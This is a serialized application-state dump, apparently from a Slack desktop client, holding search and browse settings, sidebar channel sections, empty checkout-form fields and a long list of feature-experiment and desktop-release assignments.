1602838510"version_uid"(35a40f1fb160909ea6dee0dce03ba0859ecec17e"shouldStartCreatorOnboardingF"shouldStartJoinerOnboardingF"teamCreationWorkflow0"welcomePlaceOnboardingData0"acceptTosUrl0"isEuropeT"onboardingData0"labFeaturesStartupDatao"channelCreationFlowo"sharedChannelShortcutVariantI {"channelSharingFlowo"shareChannelByEmailF"showMultiEmailUiF"maxEmailsAllowedI"sharedChannelEducationVariantI {"addToChannelFlowo"inviteToChannelByEmailF{"sharedChannelso"contentType"control{"emailClassificationo"enabledF"maxEmailsPerClassificationI {"realTimeEmailNotificationso"enabledF{{"
should_reloadF"client_min_versionN   …Ìá×A"userSawNotificationsBannerF{Øcb r o w s e r s o"activeEntity0"channelso"query" "resultso{ "metadatao{  cp a g e I"	pageCountI"
cursorMark0"
totalCountI "	isLoadingT"isFilterPanelOpenF"scrollPositionI "filterso"channelType"all"selectedOrgsa @  "selectedTeamId" "hideMemberChannelsF{"sort"name_asc"lastBrowseSort"name_asc"lastSearchSort"relevant"
lastRequestId0"lastRequestDatao"query"  cp a g e I"filterso{ "sort0"id0{"
requestIdso{ "error"none"browserSessionId0"querySessionTimeoutId0"querySessionId0"lastEventTimeMsN À&=SwB"isBootedF{"peopleo"query" "results^"metadata^cp a g e I"	pageCountI"
cursorMark0"
totalCountI "	isLoadingT"isFilterPanelOpenF"scrollPositionI "filterso"accountType"0,1,2,3,4,5,6,7,8"selectedOrgsa @  "selectedTeamId" "showDeactivatedUsersF{"sort"name_asc"lastBrowseSort"name_asc"lastSearchSort"relevant"
lastRequestId0"lastRequestData^ "
requestIds^""error"none"browserSessionId0"querySessionTimeoutId0"querySessionId0"lastEventTimeMsN À&=SwB"isBootedF{"fileso"query" "results^"metadata^ cp a g e I"	pageCountI"
cursorMark0"
totalCountI "	isLoadingT"isFilterPanelOpenF"scrollPositionI "filterso"after0"before0"froma @  "ina @  "fileType" "	fileTypes0"selectedTeamId" "excludeBotsF"onlyMyChannelsF"savedF{
"sort"timestamp_desc"lastBrowseSort"timestamp_desc"lastSearchSort"score"
lastRequestId0"lastRequestData^ "
requestIds^""error"none"browserSessionId0"querySessionTimeoutId0"querySessionId0"lastEventTimeMsN À&=SwB"isBootedF"fileBrowserDatao"
isBrowsingF"browseFocus0"isBrowseFocusLoadingF"browseFocusStateo"mediao"	isLoadingF"resultsa @  "	pageCountI "
totalCountI {"savedo"	isLoadingF"results^-"	pageCountI "
totalCountI {"myfileso"	isLoadingF"results^-"	pageCountI "
totalCountI {"recento"	isLoadingF"results^-"	pageCountI "
totalCountI {{{{"user-groupso"query" "results^"metadata^ cp a g e I"	pageCountI"
cursorMark0"
totalCountI "	isLoadingT"isFilterPanelOpenF"scrollPositionI "filterso"hideDeactivatedUserGroupsT{"sort"name_asc"lastBrowseSort"name_asc"lastSearchSort"name_asc"
lastRequestId0"lastRequestData^ "
requestIds^""error"none"browserSessionId0"querySessionTimeoutId0"querySessionId0"lastEventTimeMsN À&=SwB"isBootedF{"sharedTeamso"	refreshedI "state"ready"teamIdsa @  "suggestedIdsa @  {"
profileFieldso"	refreshedI "state"ready"
visibleFieldso{ {"filterSuggestionso"state"ready"
channelIdsa @  "	peopleIdsa @  {{"canInteracto"U01D4CWG7PBo"id"U01D4CWG7PB"interactT{"U01CRP74MB4o"id"U01CRP74MB4"interactT{"	USLACKBOTo"id"	USLACKBOT"interactT{{"channelSidebaro"selectedItemId_"appSuggestionso{ "appSuggestionImpressionsCloggedo{ "appLinkImpressionCloggedF"hideInstallAppsPromptF"aboutChannelsCoachmarkIsVisibleF" sharedChannelsCoachmarkIsVisibleF"sharedChannelsCoachmarkOrigin" "mainMenuForceOpenF"
showAnimationF"showSetupTadaCoachmarkF")isEligibleForCreateChannelCoachmarkOnBootF"shouldHighlightLimitMeterF{
"channelSectionso"channelSectionByIdo"L01CRPTEW4Ao"id"L01CRPTEW4A"type"stars"name" "emoji" "nextChannelSectionId"L01CK2AMP6J{"L01CK2AMP6Jo"id"L01CK2AMP6J"type"channels"name"Channels"emoji" "nextChannelSectionId"L01DFK6A4RW{"L01DFK6A4RWo"id"L01DFK6A4RW"type"direct_messages"name"Direktnachrichten"emoji" "nextChannelSectionId"L01D4CX376D{"L01D4CX376Do"id"L01D4CX376D"type"recent_apps"name"Neueste Apps"emoji" "nextChannelSectionId0{{"orderedChannelSectionListaI ^DI^EI^FI^G@"channelIdsByChannelSectionIdo"L01CRPTEW4AA $  "L01CK2AMP6JA $  "L01DFK6A4RWA $  "L01D4CX376DA $  {"channelSectionIdsByChannelIdo{ "localChannelSectionByIdo{ "
isEditModeF"editModeSelectedChannelIdso{ "#editModeSelectedChannelIdRangeStart0"!editModeSelectedChannelIdRangeEnd0"$editModeChannelSectionsCollapsedDicto{ "isFilteringF"query" ""lastActiveDropTargetForChannelDrago"channelSection0{")lastActiveDropTargetForChannelSectionDrago"channelSectionId0"isAfterF{"focusedChannelSectionId" {"channelPrefixeso"channelPrefixesaI o"prefix ch e l p "description"3For questions, assistance, and resources on a topic"
creator_id"slack{Io"prefix"proj"description"3For collaboration on and discussion about a project"
creator_id"slack{Io"prefix"team"description".For updates and work from a department or team"
creator_id"slack{@{"checkoutFlowo"configo cc o u n t r i e s a @  "usStateso{ "canadaStateso{ "abnCountrieso{ "stripeApiKey0"uspsApiUsername0"sourcesPayableo{ "user0{"companyAddresso"companyName" "street" "suite" "city" "
postalCode" "region" "country" "isBusinessPurchaseT"isVatIdAvailableT"vatId" "abnId" "qstId" "validationErrorso{ "isValidationActiveF{"isCheckoutAddressFormDataLoadedF"isCheckoutCreditCardFormLoadedF"creditCardDatao"cardNameo"elementType" "completeF"emptyT"erroro"code" "message" "type" {{"
cardNumber^c"
cardExpiry^c"cardCvc^c"
postalCode^c"tokeno{ "
tokenError^d"	formError^d"useExistingCreditCardF{	"isCreatingCreditCardTokenF"
paymentStatuso"okF"error" "msg" "isProcessingPaymentF{"cityAndStateFromZipo{ "invoiceDatao"
numberOfUsers" "additionalBillingContacts" "purchaseOrderNumber" "validationErrorso{ {"paymentMethodSelected"
creditCard"isAppDisconnectedDialogShownF"activeCheckoutStep"form"activeSteppedCheckoutStep"overview"isCheckoutFlowAPIErrorF"isShowingStripeDownBannerF"!isCheckoutConfigurationDataLoadedF"checkoutConfigurationo{ "activePaymentSourceo"id0"
isExisting0{"promoCodeRedeemo"	attemptedF"failedF"code" "	errorName" "discountName" "discountPercentageI {{"consistencyo"eventlogGapCountI "lastKnownEventTimestamp"1602860614.002900"bootInFlightT"warmBootInFlightF{"customEmojio"customEmojiCountI {"draftsExpansiono{ "draftPendingDestinationso{ "
ekmChangeso"ekmTs"1602859816.000000{"emailRendero"expandedEmailMetao{ "expandedQuotedTexto{ {"experimentso"handlebars_from_smarty_perfo"
experiment_id"46172931351"type"user"group" "trigger"finished"
log_exposuresF"exposure_idN LguB{"smartybars_perfo"
experiment_id"77818061717"type"user"group" "trigger"finished"
log_exposuresF"exposure_idN LguB{"gdrive_1_5_coachmark_experimento"
experiment_id"94271365346"type"user"group"yes_coach_mark"trigger"finished"
log_exposuresF"exposure_idN LguB{"ios_offline_read_marking_2o"
experiment_id"173210517495"type"user"group"offline_read_marking_enabled"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"	calls_p2po"
experiment_id"268736416752"type"user"group"enabled"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"unified_autocompleteo"
experiment_id"270095428551"type"user"group"unified"trigger"finished"
log_exposuresF"exposure_idN LguB{"onboarding_2_skipo"
experiment_id"279490891602"type"user"group"	show_skip"trigger"finished"
log_exposuresF"exposure_idN LguB{"autocomplete_fileso"
experiment_id"299214220897"type"user"group"experimental"trigger"finished"
log_exposuresF"exposure_idN LguB{"sli_channel_archive_suggestionso"
experiment_id"303678001734"type"user"group"sli_channel_archive_suggestions"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"autocomplete_suggestion_lengtho"
experiment_id"306300085110"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{"calls_create_attach_joino"
experiment_id"307534845478"type"user"group"enabled"trigger"finished"
log_exposuresF"exposure_idN LguB{"
calls_cmd_tabo"
experiment_id"320504100865"type"user"group"enabled"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"solr_cache_team_fqo"
experiment_id"323429393127"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{"sli_default_sortingo"
experiment_id"328562838083"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{"sli_all_tabo"
experiment_id"332269941778"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{"sli_omni_switcher_2o"
experiment_id"464499012052"type"user"group" "trigger"finished"
log_exposuresF"exposure_idN LguB{"sli_searcher_member_sorto"
experiment_id"475617738661"type"user"group"updated_sort"trigger"finished"
log_exposuresF"exposure_idN LguB{"reactions_tokens_searcho"
experiment_id"479070804160"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{"sli_omni_switcher_3o"
experiment_id"496050236177"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{"channel_searcho"
experiment_id"496462767395"type"user"group"channel_search"trigger"finished"
log_exposuresF"exposure_idN LguB{"add_a_channel_sidebaro"
experiment_id"502746860464"type"user"group" "trigger"finished"
log_exposuresF"exposure_idN LguB{"ios_poseidono"
experiment_id"518245657188"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"	boy_scouto"
experiment_id"520332818530"type"user"group"jumbo"trigger"finished"
log_exposuresF"exposure_idN LguB{"new_contact_formo"
experiment_id"530503885698"type"user"group"new_page"trigger"finished"
log_exposuresF"exposure_idN LguB{"newxp_joiner_landing_placeo"
experiment_id"535586359490"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{"add_a_channel_buttono"
experiment_id"536687027575"type"user"group"variant"trigger"finished"
log_exposuresF"exposure_idN LguB{""tractor_save_btn_experiment_actualo"
experiment_id"542539956432"type"user"group"variant"trigger"finished"
log_exposuresF"exposure_idN LguB{"sli_omni_switcher_4o"
experiment_id"559814394278"type"user"group"
omni_switcher"trigger"finished"
log_exposuresF"exposure_idN LguB{"jira_newxp_2043_killswitcho"
experiment_id"597927224629"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"composer_toolbaro"
experiment_id"600656402279"type"user"group"composer_toolbar"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"strollers_to_percho"
experiment_id"612853420576"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{"*platform_gdrive_in_sidebar_stdplus_connecto"
experiment_id"615183294497"type"user"group"variant"trigger"finished"
log_exposuresF"exposure_idN LguB{"sanitize_original_emailo"
experiment_id"624827677105"type"user"group"
new_sanitizer"trigger"finished"
log_exposuresF"exposure_idN LguB{"'app_directory_long_description_expandedo"
experiment_id"631994747286"type"user"group"expanded_description"trigger"	hash_user"
log_exposuresT"exposure_idN LguB{"stars_vitess_light_ts_by_usero"
experiment_id"633327904739"type"user"group"light"trigger"finished"
log_exposuresF"exposure_idN LguB{"custom_emoji_in_cliento"
experiment_id"651261890625"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"(platform_gdrive_in_sidebar_grid_existingo"
experiment_id"653143464819"type"user"group"variant"trigger"finished"
log_exposuresF"exposure_idN LguB{"july_omniswitcher_combo_expo"
experiment_id"665675632530"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{"tjws_welcome_emailo"
experiment_id"667713903792"type"user"group"
welcome_email"trigger"finished"
log_exposuresF"exposure_idN LguB{"context_baro"
experiment_id"676727670226"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{"oauth_cta_copyo"
experiment_id"682867682740"type"user"group" "trigger"finished"
log_exposuresF"exposure_idN LguB{"oauth_cta_copy_2o"
experiment_id"690060045313"type"user"group" "trigger"finished"
log_exposuresF"exposure_idN LguB{"proj_dev_email_flow_experimento"
experiment_id"691328444566"type"user"group"treatment_receives_emails"trigger"	hash_user"
log_exposuresT"exposure_idN LguB{"test_mktops_multivariateo"
experiment_id"699663608275"type"user"group"email_2"trigger"	hash_user"
log_exposuresT"exposure_idN LguB{"newxp_2832_notifications_emailo"
experiment_id"702422923271"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"omniswitcher_num_resultso"
experiment_id"722066814480"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{"app_detail_button_copyo"
experiment_id"723822841253"type"user"group"add_to_slack"trigger"finished"
log_exposuresF"exposure_idN LguB{"force_sonic_and_reloado"
experiment_id"735042130801"type"user"group"force_sonic_and_reload"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"
carpe_mpdmo"
experiment_id"736937667447"type"user"group"
carpe_mpdm"trigger"finished"
log_exposuresF"exposure_idN LguB{"sonic_incr_autho"
experiment_id"753636982884"type"user"group"control"trigger"	hash_user"
log_exposuresT"exposure_idN LguB{"fantail_nurtureo"
experiment_id"767084230119"type"user"group"fantail_nurture"trigger"finished"
log_exposuresF"exposure_idN LguB{"#desktop_release_eta_win32_4___1___0o"
experiment_id"768775190066"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{" global_actions_in_quick_switchero"
experiment_id"775462375527"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"sli_facets_module_hiddeno"
experiment_id"779848849556"type"user"group"facets_module_hidden"trigger"finished"
log_exposuresF"exposure_idN LguB{"$desktop_release_eta_darwin_4___1___0o"
experiment_id"781088664820"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"fuzzy_jumpy_moreo"
experiment_id"783169177266"type"user"group"jumpy_20"trigger"finished"
log_exposuresF"exposure_idN LguB{"sonic_rollout_2o"
experiment_id"790039927073"type"user"group"sonic"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"great_escapeo"
experiment_id"792689409221"type"user"group"full_floaty"trigger"finished"
log_exposuresF"exposure_idN LguB{"%gsuite_email_audience1_users_drip_pt3o"
experiment_id"792986575877"type"user"group"receives_2_part_email"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"o365_email_audience1_users_dripo"
experiment_id"794833838055"type"user"group"receives_3_part_email"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"+desktop_release_eta_win32_4___3___0__alpha1o"
experiment_id"796706132816"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{",desktop_release_eta_darwin_4___3___0__alpha1o"
experiment_id"798914134838"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"sorter_in_searchero"
experiment_id"804148763681"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{"#tracing_sampling_rate_symptom_evento"
experiment_id"804393825459"type"user"group"sample_rate_1_percent"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"app_home_utao"
experiment_id"808475311218"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"jira_pad_880_exp_1o"
experiment_id"817434852727"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"
app_home_ocalo"
experiment_id"818468922181"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"vedant_testo"
experiment_id"822257850866"type"user"group"
treatment2"trigger"finished"
log_exposuresF"exposure_idN LguB{"redux_cache_eviction_scheduleo"
experiment_id"822657709442"type"user"group"runtime"trigger"finished"
log_exposuresF"exposure_idN LguB{"-desktop_release_alpha_win32_4___3___0__alpha3o"
experiment_id"823185674706"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"+desktop_release_eta_win32_4___3___0__alpha3o"
experiment_id"825643396545"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{".desktop_release_alpha_darwin_4___3___0__alpha3o"
experiment_id"828048417393"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{")ios_seat_growth_experiment_request_inviteo"
experiment_id"831751532853"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"tracing_sampling_rateo"
experiment_id"833002791380"type"user"group"sample_rate_1_percent"trigger"launch_user"
log_exposuresF"exposure_idN LguB{",desktop_release_eta_darwin_4___3___0__alpha3o"
experiment_id"833574653861"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"dev_app_home_update_endpointo"
experiment_id"837079795779"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"search_tab_countso"
experiment_id"838818099858"type"user"group" "trigger"finished"
log_exposuresF"exposure_idN LguB{"(forget_groups_conversations_invitesharedo"
experiment_id"851220432884"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"-desktop_release_alpha_darwin_4___3___0__beta1o"
experiment_id"861515193491"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"
ia_top_navo"
experiment_id"870524512385"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{",desktop_release_alpha_win32_4___3___0__beta1o"
experiment_id"872526814628"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"+desktop_release_eta_darwin_4___3___0__beta1o"
experiment_id"872526859220"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"*desktop_release_eta_win32_4___3___0__beta1o"
experiment_id"874843122887"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"jira_pad_880_exp_2o"
experiment_id"883937394194"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{",desktop_release_alpha_win32_4___3___2__beta2o"
experiment_id"893237454258"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"-desktop_release_alpha_darwin_4___3___2__beta2o"
experiment_id"893237483042"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"channel_sections_warmup_writeo"
experiment_id"904728449074"type"user"group"warmup_writes_enabled"trigger"launch_user"
log_exposuresF"exposure_idN LguB{",desktop_release_beta_darwin_4___3___2__beta2o"
experiment_id"906022372256"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"+desktop_release_beta_win32_4___3___2__beta2o"
experiment_id"908229217446"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"omni_sortero"
experiment_id"908858323174"type"user"group"
sorterplus"trigger"finished"
log_exposuresF"exposure_idN LguB{"-desktop_release_alpha_win32_4___4___0__alpha1o"
experiment_id"914348679681"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"+better_app_suggestions_enable_for_aaa_teamso"
experiment_id"914673311075"type"user"group"variant"trigger"finished"
log_exposuresF"exposure_idN LguB{"snd_cinnamon_challengeo"
experiment_id"916381274723"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{"reactji_awareness_v2o"
experiment_id"917796832740"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"channel_sections_dark_reado"
experiment_id"919362849767"type"user"group"dark_reads_enabled"trigger"launch_user"
log_exposuresF"exposure_idN LguB{".desktop_release_alpha_darwin_4___4___0__alpha1o"
experiment_id"924523470864"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"ia_channel_details_appso"
experiment_id"927334607811"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"%desktop_release_prod_darwin_4___3___3o"
experiment_id"928927528769"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"#channel_sections_validation_cleanupo"
experiment_id"932912778146"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"nova_unread_threadso"
experiment_id"933904364199"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"janice_search_eno"
experiment_id"936857402101"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{"modernize_admin_inviteso"
experiment_id"937164462993"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"snd_fuzzy_peopleo"
experiment_id"938283913572"type"user"group"fuzzy"trigger"finished"
log_exposuresF"exposure_idN LguB{"-desktop_release_alpha_darwin_4___4___0__beta1o"
experiment_id"940148998355"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"
custom_dndo"
experiment_id"950278628531"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{",desktop_release_alpha_win32_4___4___0__beta1o"
experiment_id"951162936612"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{",better_app_suggestions_send_auth_suggestionso"
experiment_id"951341632613"type"user"group"variant"trigger"finished"
log_exposuresF"exposure_idN LguB{"files_in_inputo"
experiment_id"954004811585"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"snd_cinnamon_challenge_v2o"
experiment_id"955293254390"type"user"group"update"trigger"finished"
log_exposuresF"exposure_idN LguB{"+desktop_release_beta_win32_4___4___0__beta3o"
experiment_id"962204185202"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"-desktop_release_alpha_darwin_4___4___0__beta3o"
experiment_id"962204232722"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"parsec_users_channelso"
experiment_id"962338505488"type"user"group"use_3_cluster_multi_sb1010"trigger"finished"
log_exposuresF"exposure_idN LguB{"chat_login_faster_grido"
experiment_id"966555663155"type"user"group"faster"trigger"finished"
log_exposuresF"exposure_idN LguB{",desktop_release_eta_darwin_4___5___0__alpha1o"
experiment_id"970799636085"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"+desktop_release_eta_win32_4___5___0__alpha1o"
experiment_id"972642748535"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"solr_dt_range_filterso"
experiment_id"974658628019"type"user"group"solr_dt_range_filters"trigger"finished"
log_exposuresF"exposure_idN LguB{",desktop_release_alpha_win32_4___4___0__beta3o"
experiment_id"974993341632"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{",desktop_release_beta_darwin_4___4___0__beta3o"
experiment_id"975011247461"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"ia_sidebar_a11yo"
experiment_id"978677695030"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"-desktop_release_alpha_win32_4___5___0__alpha3o"
experiment_id"981816627780"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"+desktop_release_eta_win32_4___5___0__alpha3o"
experiment_id"981816646276"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{".desktop_release_alpha_darwin_4___5___0__alpha3o"
experiment_id"981816662276"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{",desktop_release_eta_darwin_4___5___0__alpha3o"
experiment_id"982289241573"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{",desktop_release_eta_darwin_4___5___0__alpha4o"
experiment_id"983158097779"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{".desktop_release_alpha_darwin_4___5___0__alpha4o"
experiment_id"984542489809"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"impression_logging_webo"
experiment_id"987920723095"type"user"group"enabled"trigger"finished"
log_exposuresF"exposure_idN LguB{"apidocs_no_hero_for_logged_ino"
experiment_id"988591185622"type"user"group"hero"trigger"finished"
log_exposuresF"exposure_idN LguB{"parsec_users_channels_loadtesto"
experiment_id"993373406727"type"user"group"parsec_users_channels_loadtest"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"%desktop_release_beta_darwin_4___4___0o"
experiment_id"996207968243"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"+desktop_release_eta_win32_4___5___0__alpha4o"
experiment_id"996488833511"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"-desktop_release_alpha_win32_4___5___0__alpha4o"
experiment_id"996835513238"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"$desktop_release_beta_win32_4___4___0o"
experiment_id"
1007675306640"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"$desktop_release_prod_win32_4___4___0o"
experiment_id"
1010386528005"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"thread_getview_limito"
experiment_id"
1015332949412"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{",desktop_release_alpha_win32_4___5___0__beta2o"
experiment_id"
1016986413458"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"add_member_modal_inviteso"
experiment_id"
1016986869697"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"+desktop_release_eta_darwin_4___5___0__beta2o"
experiment_id"
1026207399605"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"*desktop_release_eta_win32_4___5___0__beta2o"
experiment_id"
1029004729236"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"+desktop_release_beta_win32_4___5___0__beta2o"
experiment_id"
1029006941348"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{",desktop_release_beta_darwin_4___5___0__beta2o"
experiment_id"
1029007005188"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"%desktop_release_prod_darwin_4___4___1o"
experiment_id"
1030465761638"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"-desktop_release_alpha_darwin_4___5___0__beta2o"
experiment_id"
1031529299543"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"put_a_mention_on_it_v2o"
experiment_id"
1047562275223"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{".desktop_release_alpha_darwin_4___6___0__alpha1o"
experiment_id"
1050052211335"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"workflows_getting_startedo"
experiment_id"
1050517134579"type"user"group"
treatment1"trigger"finished"
log_exposuresF"exposure_idN LguB{" snd_channel_ranking_model_updateo"
experiment_id"
1050604106304"type"user"group"update"trigger"finished"
log_exposuresF"exposure_idN LguB{"fetch_bot_id_from_users_teamso"
experiment_id"
1052608996576"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"
le_test_04_09o"
experiment_id"
1053598093827"type"user"group"treatment_1"trigger"	hash_user"
log_exposuresT"exposure_idN LguB{"pad_1132o"
experiment_id"
1062733124503"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{"+desktop_release_beta_win32_4___5___0__beta3o"
experiment_id"
1068824557840"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{",desktop_release_alpha_win32_4___5___0__beta3o"
experiment_id"
1068824584624"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"*desktop_release_eta_win32_4___5___0__beta3o"
experiment_id"
1068824604448"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{",desktop_release_beta_darwin_4___5___0__beta3o"
experiment_id"
1068824622688"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"-desktop_release_alpha_darwin_4___5___0__beta3o"
experiment_id"
1068824641392"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"+desktop_release_eta_darwin_4___5___0__beta3o"
experiment_id"
1068824660928"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"-desktop_release_alpha_win32_4___6___0__alpha1o"
experiment_id"
1077411111521"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"	xws_starso"
experiment_id"
1082423560530"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"snd_autocomplete_model_cacheo"
experiment_id"
1086958104752"type"user"group"treatment_dual"trigger"finished"
log_exposuresF"exposure_idN LguB{"snd_channel_membership_cacheo"
experiment_id"
1089504796227"type"user"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN LguB{"calendar_create_event_shortcuto"
experiment_id"
1091796950341"type"user"group"enabled"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"%desktop_release_prod_darwin_4___4___2o"
experiment_id"
1092608062931"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{",desktop_release_beta_darwin_4___6___0__beta1o"
experiment_id"
1096505872567"type"user"group"receives_desktop_update"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"xws_threadso"
experiment_id"
1097444783363"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"rm_score_from_timestamp_searcho"
experiment_id"
1098154214165"type"user"group"control"trigger"	hash_user"
log_exposuresT"exposure_idN LguB{"iap2o"
experiment_id"
1098840830311"type"user"group"	treatment"trigger"launch_user"
log_exposuresF"exposure_idN LguB{"!custom_status_modal_calendar_synco"
experiment_id"
1115753511654"type"user"group"control"trigger"finished"
log_exposuresF"exposure_idN LguB{"%desktop_release_prod_darwin_4___5___1o"
experiment_id"
1115977541989"type"user"group"receives_desktop_update"trigger"launch_user"
